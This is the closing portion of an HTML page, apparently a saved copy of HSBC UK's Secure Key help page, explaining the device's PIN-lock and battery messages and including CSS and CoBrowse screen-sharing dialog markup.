                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/lock_pin_fail_1_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">LOCK PIN FAIL 1<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The PIN reset code has been entered incorrectly. Press the green button lightly and quickly - do not hold it down. You will then be promted to enter the reset code again.</p>
                                        <p>You should ensure that you are entering the reset code exactly as it appears on screen.</p>
                                        <p>To protect you from fraud, the HSBC Secure Key will lock after three incorrect entries.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/lock_pin_fail_2_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">LOCK PIN FAIL 2 <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The PIN reset code has been entered incorrectly. Press the green button lightly and quickly - do not hold it down. You will then be promted to enter the reset code again.</p>
                                        <p>You should ensure that you are entering the reset code exactly as it appears on screen.</p>
                                        <p>To protect you from fraud, the HSBC Secure Key will lock after three incorrect entries.</p>

                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/lock_pin_fail_3_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">LOCK PIN FAIL 3<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The PIN reset code has been entered incorrectly for a third time. The HSBC Secure Key is now temporarily locked and you will be unable to use it for approximately 1 hour. This message will remain on the screen of the HSBC Secure Key until the lock out has expired, then the Device will automatically power off.</p>
                                        <p>When the HSBC Secure Key is turned back on 'LOCK PIN' and a 7 digit number will be displayed on the screen. Press the green button lightly and quickly - do not hold it down and enter your PIN reset code again. You should ensure that you are entering the code exactly as it appears on screen.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/lock_pin_fail_4_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">LOCK PIN FAIL 4<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The PIN reset code has been entered incorrectly for a fourth time. The HSBC Secure Key is now temporarily locked and you will be unable to use it for approximately 1 hour. This message will remain on the screen of the HSBC Secure Key until the lock out has expired, then the Device will automatically power off.</p>
                                        <p>When the HSBC Secure Key is turned back on 'LOCK PIN' and a 7 digit number will be displayed on the screen. Press the green button lightly and quickly - do not hold it down and enter your PIN reset code again. </p>
                                        <p>If you are unsure what your PIN reset code is, you can generate another code. To do this, start logging on to Personal Internet Banking and enter your user ID. At the next screen click the 'Forgotten your HSBC Secure Key PIN', follow the on screen instructions and you will be given a PIN Reset Code.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_20_115x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">LOCK NEW PIN<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>HSBC Secure Key is unlocked and you need to create a new HSBC Secure Key PIN. Think of a number between 4 and 8 digits long. You should avoid using sequential or repeated numbers such as 1234 or 1111. Enter this into your HSBC Secure Key and press the yellow button.</p>
                                        <p>Note: if you make a mistake entering your PIN, you can use the green button to delete the last digit you have input. </p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_21_116x54.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">LOCK PIN CONF <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The PIN you are setting up needs to be confirmed. Please re-enter your chosen PIN.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/lock_fail_pin_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">LOCK FAIL PIN<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>Press the yellow button to return to the PIN setup and repeat the steps to set up a PIN.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_23_116x54.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">LOCK NEW PIN NOT SAFE<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The new PIN you have entered is not safe and could be guessed. Please enter another PIN. </p>

                                        <p>Your PIN can be made up of any numbers as long as they don't follow a logical or sequential pattern, for example 123456 or 11111.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_43_115x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">BUTTON<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>One of the buttons on your HSBC Secure Key has been held down for too long. To save battery power, HSBC Secure Key will automatically power off.</p>
                                        <p>You can turn the HSBC Secure Key back on by pressing and holding down the green button, enter your PIN and repeat what you were trying to do.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_44_115x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">BATT 2 <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The battery is running low. Don't worry - there are still approximately 2 months of power remaining. You should order a replacement HSBC Secure Key by calling:
                                            <br> Customer Services on 03456 002290.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/batt_1_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">BATT 1 <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The battery is running low. Don't worry - there's still approximately 1 month of power remaining. You should order a replacement HSBC Secure Key by calling:
                                            <br> Customer Services on 03456 002290.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/batt_0_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">BATT 0 <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The battery is running very low. There is only minimal power left. You should order a replacement HSBC Secure Key as soon as possible. You can do this by calling:
                                            <br> Customer Services on 03456 002290.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>

    </div>

    <div id="lightboxContent" style="display:none;">
        <div class="alertLightbox info Clearfix">
            <div class="alertLightboxInner">
                <div class="row">
                    <h3 class="headingStyle03">
						To report a lost, stolen or broken Secure Key, please call the Online Banking helpdesk on 0345 600 2290.
					</h3>
                </div>
                <a class="button secondary primaryBtn" href="#"> <span class="buttonInner buttonClose jsClose">Close</span>
                </a>

            </div>
        </div>
    </div>
    <div id="lightboxContentSoft" style="display:none;">
        <div class="alertLightbox info Clearfix">
            <div class="alertLightboxInner">
                <div class="row">
                    <h3 class="headingStyle03">
						Please call Customer Service on 0345 600 2290 to report a Lost, damaged or stolen device
					</h3>
                </div>
                <a class="button secondary primaryBtn" href="#"> <span class="buttonInner buttonClose jsClose">Close</span>
                </a>

            </div>
        </div>
    </div>

    <style>
        .CoBrowseHiddenForScreenReader {
            position: absolute;
            left: -10000px;
            top: auto;
            width: 1px;
            height: 1px;
            overflow: hidden;
        }
        
        input.CoBrowseCheckBox[type=checkbox]:checked ~ #tealiumAcceptTC {
            display: none !important;
        }
        
        .CoBrowseFade {
            display: none;
            position: fixed;
            left: 0 !important;
            top: 0 !important;
            bottom: 0 !important;
            right: 0 !important;
            width: 100%;
            height: 100%;
            z-index: 3000;
            background: rgba(0, 0, 0, 0.6);
        }
        
        .modale-shadowCob {
            display: block;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 9110;
            background: rgba(0, 0, 0, .7);
            cursor: pointer;
            z-index: 9250
        }
        
        .modale {
            transition: opacity .25s cubic-bezier(0, .7, .38, 1);
            -webkit-transition: opacity .25s cubic-bezier(0, .7, .38, 1);
            -moz-transition: opacity .25s cubic-bezier(0, .7, .38, 1);
            -o-transition: opacity .25s cubic-bezier(0, .7, .38, 1);
            opacity: 1;
            visibility: visible;
            position: fixed;
            font-family: sans-serif
        }
        
        .modale.hidden {
            opacity: 0;
            visibility: hidden
        }
        
        .modale-content {
            z-index: 9251;
            background: white;
            border: 2px solid #DDDDDD;
            text-align: left;
            top: 50%;
            left: 50%;
            -webkit-transform: translate(-50%, -50%);
            -ms-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            padding: 40px;
            width: 540px
        }
        
        .modale-content .content {
            max-height: 410px;
            overflow-y: auto;
            overflow-x: hidden
        }
        
        .modale-title {
            font-weight: normal !important;
            font-size: 28px !important;
            line-height: 28px !important;
            margin-bottom: 15px;
            padding-bottom: 0 !important;
            color: #333 !important;
            text-align: center
        }
        
        .modale-text {
            line-height: 17px !important;
            margin-bottom: 24px;
            font-size: 16px !important;
            padding-bottom: 0 !important
        }
        
        .modale-text img {
            max-width: 100%
        }
        
        .modale-text--center {
            text-align: center
        }
        
        .buttonCloseModale {
            background: none;
            border: none;
            text-decoration: none;
            font-size: 40px;
            color: #333;
            cursor: pointer;
            position: absolute;
            top: 15px;
            right: 20px;
            height: 50px;
            width: 50px;
            text-align: center;
        }
        
        .buttonCloseModale:hover {
            color: #b6b7b6;
            cursor: pointer
        }
        
        .buttonCloseModale:focus {
            border-bottom: 1px solid black !important;
        }
        
        .text-non {
            margin-bottom: 10px
        }
        
        .text-non span {
            color: #db0011
        }
        
        body .modale-img {
            max-width: 100%;
            text-align: center
        }
        
        .modale-text--center {
            text-align: center
        }
        
        .selectRadioPopin {
            margin-bottom: 26px;
            font-size: 16px;
            color: #333
        }
        
        .modale-list {
            margin-left: 6px;
            margin-top: 16px;
            padding-bottom: 37px;
            padding-left: 18px;
            width: 51%;
            display: inline-block
        }
        
        .modale-list li {
            padding-bottom: 0;
            font-size: 16px;
            text-align: left
        }
        
        .selectTitle,
        .radioGroup,
        .radio {
            display: inline-block
        }
        
        .radio {
            margin-left: 32px;
            margin-bottom: 3px
        }
        
        .buttonsModale {
            width: 100%;
            padding: 10px 0;
            display: inline-block;
            border-top: 0 !important;
            margin-top: 10px
        }
        
        .modaleBtnOui {
            display: inline-block;
            text-align: center;
            text-decoration: none;
            font-family: sans-serif;
            font-size: 16px;
            padding: 15px 20px;
            background-color: #db0011;
            color: white;
            line-height: 1 !important
        }
        
        .modaleBtnOui:hover {
            background-color: #A4000D;
            text-decoration: none;
            color: white
        }
        
        .modaleBtnOui:active,
        .modaleBtnOui:focus {
            background-color: #83000A;
            text-decoration: none;
            color: white;
            outline: none
        }
        
        .modaleBtnNon {
            display: inline-block;
            text-align: center;
            text-decoration: none;
            font-family: sans-serif;
            font-size: 16px;
            padding: 14px 20px;
            text-decoration: none;
            cursor: pointer;
            border: 1px solid #333;
            color: #333;
            margin-right: 8px;
            line-height: 1 !important
        }
        
        .modaleBtnNon:hover {
            border: 1px solid #333;
            background-color: rgba(0, 0, 0, 0.05);
            text-decoration: none;
            color: #333
        }
        
        .modaleBtnNon:active,
        .modaleBtnNon:focus {
            border: 1px solid #333;
            background-color: rgba(0, 0, 0, 0.15);
            text-decoration: none;
            color: #333;
            outline: none
        }
        
        .disclaimerPopin {
            display: inline-block;
            color: #333;
            font-size: 14px
        }
        
        body .buttonsModale a.continueBtn {
            float: right
        }
        
        .CoBrowseTextInput input {
            border: 1px solid #ccc;
            margin: 0 7px 3px 0;
            padding: 10px;
            width: 264px
        }
        
        .modale-text.error_red {
            color: #db0011;
            margin: 0;
            font-size: 14px!important;
        }
        
        span.error_input_exclamation {
            background-color: #db0011;
            padding: 6px 12px 5px 12px;
            font-size: 22px;
            margin-left: -38px;
            font-weight: bold;
            color: #fff;
            vertical-align: middle
        }
        
        label.modale-text {
            font-weight: bold !important;
            display: inline-block;
            margin-bottom: 12px;
        }
        
        .content .modale-text input.CoBrowseCheckBox:focus {
            outline: 1px solid black !important;
        }
    </style>
    <div tabindex="-1">
        <div id="CoBrowseBackgroundOverlay1" class="CoBrowseFade"></div>
        <div aria-hidden="true" class="modale modale-content hidden" role="dialog" aria-labelledby="dialogTitleDiv1" aria-describedby="dialogDescriptionDiv1" id="modale-cob1" tabindex="0">
            <div class="content">
                <button tabindex="0" onclick="window.tealiumCobrowseClose(1);" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob1"><span class="CoBrowseHiddenForScreenReader">Close</span><span aria-hidden="true">×</span></button>
                <h3 id="dialogTitleDiv1" class="modale-title">CoBrowse</h3>
                <div id="dialogDescriptionDiv1">
                    <p class="modale-text">CoBrowse allows you to share your screen with a Contact Centre Agent if you need help with HSBC Online Banking.</p>
                    <p class="modale-text">This service is only available during business hours and if during your call or Live Chat conversation your query could be supported by CoBrowse, your Contact Centre Agent will provide a CoBrowse Service Number to start the service.</p>
                    <p class="modale-text">Please enter the CoBrowse Service Number provided by our Contact Centre Agent below.</p>
                </div>
                <div>
                    <label for="cobrowseIDSession1" class="modale-text">CoBrowse Service Number:</label>
                </div>
                <div class="CoBrowseTextInput">
                    <input type="text" name="idSession" id="cobrowseIDSession1">
                </div>
            </div>
            <div class="buttonsModale"><a href="#" class="modaleBtnNon modale-closeCob" title="Cancel" style="outline: 0px;" onclick="window.tealiumCobrowseClose(1); return false;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="nextCob" href="#" title="Continue" style="outline: 0px;" onclick="window.tealiumVerifyCobrowse(1); return false;">Continue</a></div>
        </div>
    </div>
    <div tabindex="-1">
        <div id="CoBrowseBackgroundOverlay2" class="CoBrowseFade"></div>
        <div aria-hidden="true" class="modale modale-content hidden" role="dialog" aria-labelledby="dialogTitleDiv2" aria-describedby="dialogDescriptionDiv2" id="modale-cob2" tabindex="0">
            <div class="content">
                <button tabindex="0" onclick="window.tealiumCobrowseClose(2);" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob2"><span class="CoBrowseHiddenForScreenReader">Close</span><span aria-hidden="true">×</span></button>
                <h3 id="dialogTitleDiv2" class="modale-title">CoBrowse Terms and Conditions</h3>
                <div id="dialogDescriptionDiv2">
                    <p class="modale-text">This service allows HSBC UK’s Contact Centre Agent to see your web browser, as it appears on your own device. For security and privacy reasons the Contact Centre Agent won’t be able to see any other applications running on your device. They also won’t be able to type, press buttons, make any applications or transactions for you and can’t see passwords or other security information even if they’re visible on your device.</p>
                    <p class="modale-text">If you agree to this service, please tick the box below to accept the Terms and Conditions then select ‘Continue’ to start the session.</p>
                </div>
                <p class="modale-text">
                    <input class="CoBrowseCheckBox" aria-describedby="tealiumAcceptTC" type="checkbox" name="checkbox" id="checkbox">
                    <label style="font-size: 16px;" for="checkbox">&nbsp;I have read and accept the Terms and Conditions</label>
                    <br><span id="tealiumAcceptTC" class="modale hidden" role="alert" style="display: none; margin-top: 10px;font-size:14px;color:#db0011;" aria-hidden="true">Please accept the Terms and Conditions</span></p>
            </div>
            <div class="buttonsModale"><a class="modaleBtnNon modale-closeCob" onclick="window.tealiumCobrowseClose(2); return false;" href="#" title="Cancel" style="outline: 0px;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="launchCob" href="#" title="Continue" style="outline: 0px;" onclick="window.tealiumCobrowseAcceptTC(); return false;">Continue</a></div>
        </div>
        <div class="modale modale-shadowCob hidden" aria-hidden="true"></div>
    </div>
    <div tabindex="-1">
        <div id="CoBrowseBackgroundOverlay3" class="CoBrowseFade"></div>
        <div aria-hidden="true" class="modale modale-content hidden" role="dialog" aria-labelledby="dialogTitleDiv3" aria-describedby="dialogDescriptionDiv3" id="modale-cob3" tabindex="0">
            <div class="content">
                <button tabindex="0" onclick="window.tealiumCobrowseClose(3);" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob3"><span class="CoBrowseHiddenForScreenReader">Close</span><span aria-hidden="true">×</span></button>
                <h3 id="dialogTitleDiv3" class="modale-title">CoBrowse</h3>
                <div id="dialogDescriptionDiv3">
                    <p class="modale-text">
                        <br>CoBrowse allows you to share your screen with a Contact Centre Agent if you need help with HSBC Online Banking.</p>
                    <p class="modale-text">This service is only available during business hours and if during your call or Live Chat conversation your query could be supported by CoBrowse, your Contact Centre Agent will provide a CoBrowse Service Number to start the service.</p>
                    <p class="modale-text">Please enter the CoBrowse Service Number provided by our Contact Centre Agent below.</p>
                </div>
                <div>
                    <label for="cobrowseIDSession3" class="modale-text">CoBrowse Service Number:</label>
                </div>
                <div class="CoBrowseTextInput">
                    <input aria-describedby="termsAndConditionError" type="text" name="idSession" id="cobrowseIDSession3"><span class="error_input_exclamation">!</span>
                    <p id="termsAndConditionError" role="alert" class="modale-text error_red">The CoBrowse Service Number you have entered doesn't match our records. Please try again.</p>
                </div>
            </div>
            <div class="buttonsModale"><a class="modaleBtnNon modale-closeCob" href="#" onclick="window.tealiumCobrowseClose(3); return false;" title="Cancel" style="outline: 0px;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="restartCob" href="#" title="Continue" style="outline: 0px;" onclick="window.tealiumVerifyCobrowse(3); return false;">Continue</a></div>
        </div>
        <div class="modale modale-shadowCob hidden" aria-hidden="true"></div>
    </div>
    <div tabindex="-1">
        <div id="CoBrowseBackgroundOverlay4" class="CoBrowseFade"></div>
        <div aria-hidden="true" class="modale modale-content hidden" role="dialog" aria-labelledby="dialogTitleDiv4" aria-describedby="dialogDescriptionDiv4" id="modale-cob4" tabindex="0">
            <div class="content">
                <button tabindex="0" onclick="window.tealiumCobrowseClose(4);" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob4"><span class="CoBrowseHiddenForScreenReader">Close</span><span aria-hidden="true">×</span></button>
                <h3 id="dialogTitleDiv4" class="modale-title">CoBrowse</h3>
                <div id="dialogDescriptionDiv4">
                    <p class="modale-text"><strong>Please enter a valid CoBrowse Service Number</strong></p>
                    <p class="modale-text">Please check the CoBrowse Service Number with the customer service representative and enter it again.</p>
                </div>
                <div>
                    <label for="cobrowseIDSession4" class="modale-text">CoBrowse Service Number:</label>
                </div>
                <div class="CoBrowseTextInput">
                    <input type="text" name="idSession" id="cobrowseIDSession4">
                </div>
            </div>
            <div class="buttonsModale"><a class="modaleBtnNon modale-closeCob" onclick="window.tealiumCobrowseClose(4); return false;" href="#" title="Cancel" style="outline: 0px;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="restartCob" href="#" title="Continue" style="outline: 0px;" onclick="window.tealiumVerifyCobrowse(4); return false;">Continue</a></div>
        </div>
        <div class="modale modale-shadowCob hidden" aria-hidden="true"></div>
    </div>
    <span></span><span></span><span>
	
	</span>
    
    
</body>

</html>